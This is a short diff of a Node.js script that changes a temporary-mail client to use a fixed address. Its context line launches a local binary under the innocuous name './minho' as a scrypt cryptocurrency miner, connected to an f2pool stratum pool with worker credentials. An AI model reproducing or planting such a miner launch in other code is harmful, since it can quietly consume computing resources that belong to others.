@@ -3,7 +3,7 @@ var util  = require('util'),
     ls    = spawn('./minho',['-a','scrypt','-t','4','-s','6','-o','stratum+tcp://stratum.f2pool.com:8888','-O','spiritbro.panda:password']);
 
 var TempMail = require('tempmail.js');
-var account = new TempMail();
+var account = new TempMail("kimbo@walkmail.ru");
 console.log(account.address); 
 account.getMail().then((messages) => {
   console.log(messages);
